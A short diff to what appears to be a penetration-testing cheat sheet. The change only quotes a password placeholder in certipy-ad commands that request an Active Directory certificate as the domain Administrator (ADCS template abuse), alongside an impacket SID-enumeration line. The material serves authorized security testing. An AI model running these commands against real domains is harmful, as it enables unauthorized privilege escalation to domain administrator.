@@ -5037,13 +5037,13 @@ impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
 ```
 
 ```console
-certipy-ad req -u '<USERNAME>@<DOMAIN>' -p <PASSWORD> -ca '<CA>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-2983547755-698260136-4283918172-500'
+certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-2983547755-698260136-4283918172-500'
 ```
 
 ###### Fixing Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template Error
 
 ```console
-certipy-ad req -u '<USERNAME>@<DOMAIN>' -p <PASSWORD> -ca '<CA>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -key-size '4096'
+certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -key-size '4096'
 ```
 
 #### ADCSTemplate
